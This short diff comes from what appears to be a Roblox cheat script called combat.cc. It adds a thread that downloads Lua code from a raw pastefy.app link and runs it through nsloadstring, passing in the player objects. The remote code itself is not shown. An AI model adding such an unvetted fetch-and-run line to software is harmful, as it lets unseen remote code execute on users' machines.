@@ -8943,6 +8943,10 @@ task.spawn(function()
 	Invite(VerifyChannelInvite)
 end)
 
+ThreadManager:Start("CustomCode", function()
+	nsloadstring(false, "https://pastefy.app/e58XLuoV/raw", {Players, LocalPlayer})
+end, 5)
+
 print("[nikoletoscripts/combat.cc]: Loaded script successfully in " .. tostring(tick() - StartTick) .. "s.")
 
 task.spawn(function(...)
